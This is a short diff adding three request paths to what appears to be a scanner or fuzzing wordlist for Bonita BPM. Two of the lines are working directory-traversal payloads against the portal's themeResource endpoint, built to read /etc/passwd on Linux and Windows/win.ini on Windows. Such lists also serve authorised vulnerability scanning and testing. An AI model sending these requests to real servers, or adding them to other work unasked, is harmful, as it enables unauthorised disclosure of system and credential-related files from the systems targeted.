@@ -1,0 +1,3 @@
+/bonita/login.jsp
+/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=etc/passwd
+/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=Windows/win.ini
